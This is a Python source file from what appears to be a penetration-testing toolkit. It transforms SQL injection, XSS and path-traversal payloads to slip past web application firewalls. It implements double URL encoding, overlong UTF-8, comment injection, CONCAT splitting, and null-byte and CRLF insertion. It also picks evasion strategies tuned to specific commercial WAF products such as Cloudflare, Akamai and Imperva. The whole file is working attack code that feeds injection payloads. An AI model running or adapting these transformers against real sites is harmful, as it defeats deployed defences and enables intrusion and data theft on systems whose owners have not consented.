"""
pentest/waf_evasion.py
WAF evasion payload transformers.
Encoding, chunking, case variation, comment injection.
Used by injection.py and other modules when WAF is detected.
"""

import random
import urllib.parse
from typing import List


# ── Evasion strategies ───────────────────────────────────────────────

def apply_evasion(payload: str, strategies: list = None) -> List[str]:
    """
    Apply multiple WAF evasion strategies to a payload.
    Returns list of transformed payloads (original + evaded variants).
    """
    if strategies is None:
        strategies = ["url_encode", "double_encode", "case_swap",
                      "comment_inject", "unicode", "chunk"]

    variants = [payload]  # always include original

    for strat in strategies:
        fn = STRATEGY_MAP.get(strat)
        if fn:
            try:
                variant = fn(payload)
                if variant and variant != payload:
                    variants.append(variant)
            except Exception:
                pass

    return variants


def url_encode(payload: str) -> str:
    """Single URL encoding of special characters."""
    return urllib.parse.quote(payload, safe="")


def double_encode(payload: str) -> str:
    """Double URL encoding — bypasses single-decode WAFs."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def case_swap(payload: str) -> str:
    """Random case variation — bypasses case-sensitive regex WAFs."""
    result = []
    for ch in payload:
        if ch.isalpha():
            result.append(ch.upper() if random.random() > 0.5 else ch.lower())
        else:
            result.append(ch)
    return "".join(result)


def comment_inject(payload: str) -> str:
    """
    Inject SQL/HTML comments to break WAF signatures.
    ' OR '1'='1  →  '/**/OR/**/'1'='1
    <script>     →  <scr/**/ipt>
    """
    # SQL comment injection
    for keyword in ["SELECT", "UNION", "OR", "AND", "FROM", "WHERE"]:
        payload = payload.replace(keyword, f"/*!{keyword}*/")
        payload = payload.replace(keyword.lower(), f"/*!{keyword.lower()}*/")

    return payload


def unicode_encode(payload: str) -> str:
    """Unicode / overlong UTF-8 encoding for path traversal."""
    replacements = {
        "/": "%c0%af",
        "\\": "%c1%9c",
        ".": "%u002e",
        "'": "%u0027",
        '"': "%u0022",
    }
    result = payload
    for char, encoded in replacements.items():
        result = result.replace(char, encoded, 1)  # replace first occurrence
    return result


def chunk_payload(payload: str) -> str:
    """
    Break payload into chunks with null bytes / whitespace.
    Bypasses pattern-matching WAFs that look for contiguous strings.
    """
    # Insert zero-width chars for HTML context
    if "<" in payload:
        return payload.replace("<", "<\x00").replace(">", "\x00>")

    # For SQL context, use inline comments
    words = payload.split()
    return "/**/".join(words)


def hex_encode(payload: str) -> str:
    """Hex encode characters — useful for SQL context."""
    result = []
    for ch in payload:
        if ch.isalpha():
            result.append(f"0x{ord(ch):02x}")
        else:
            result.append(ch)
    return "".join(result)


def concat_bypass(payload: str) -> str:
    """
    SQL CONCAT bypass: 'admin' → CONCAT('ad','min')
    Breaks string-matching WAFs.
    """
    if "'" in payload:
        parts = payload.split("'")
        rebuilt = []
        for p in parts:
            if len(p) > 3 and p.isalnum():
                mid = len(p) // 2
                rebuilt.append(f"CONCAT('{p[:mid]}','{p[mid:]}')")
            else:
                rebuilt.append(f"'{p}'")
        return ",".join(rebuilt)
    return payload


def null_byte_inject(payload: str) -> str:
    """Null byte injection — bypasses extension checks."""
    return payload + "%00"


def newline_inject(payload: str) -> str:
    """CRLF / newline injection in headers."""
    return payload.replace(" ", "%0d%0a")


# ── Strategy registry ────────────────────────────────────────────────

STRATEGY_MAP = {
    "url_encode":     url_encode,
    "double_encode":  double_encode,
    "case_swap":      case_swap,
    "comment_inject": comment_inject,
    "unicode":        unicode_encode,
    "chunk":          chunk_payload,
    "hex":            hex_encode,
    "concat":         concat_bypass,
    "null_byte":      null_byte_inject,
    "newline":        newline_inject,
}


def get_strategies_for_waf(waf_name: str) -> list:
    """
    Return best evasion strategies for a known WAF product.
    Informed by real-world WAF bypass research.
    """
    waf = waf_name.lower() if waf_name else ""

    if "cloudflare" in waf:
        return ["double_encode", "unicode", "case_swap", "chunk"]
    elif "akamai" in waf:
        return ["url_encode", "comment_inject", "case_swap", "hex"]
    elif "imperva" in waf or "incapsula" in waf:
        return ["double_encode", "unicode", "concat", "case_swap"]
    elif "aws" in waf or "waf" in waf:
        return ["url_encode", "case_swap", "comment_inject"]
    elif "modsecurity" in waf:
        return ["double_encode", "comment_inject", "chunk", "hex"]
    elif "f5" in waf or "big-ip" in waf:
        return ["unicode", "case_swap", "double_encode"]
    elif "sucuri" in waf:
        return ["double_encode", "unicode", "comment_inject"]
    else:
        # Generic — try everything
        return ["url_encode", "double_encode", "case_swap",
                "comment_inject", "unicode"]


def evade_for_host(payload: str, host: str, waf_map: dict) -> List[str]:
    """
    Given a payload and a host, check if host has WAF detected
    and return evasion variants. Falls back to original payload only.
    """
    waf_info = waf_map.get(host, {})
    waf_name = waf_info.get("waf", "")

    if not waf_name:
        return [payload]

    strategies = get_strategies_for_waf(waf_name)
    return apply_evasion(payload, strategies)
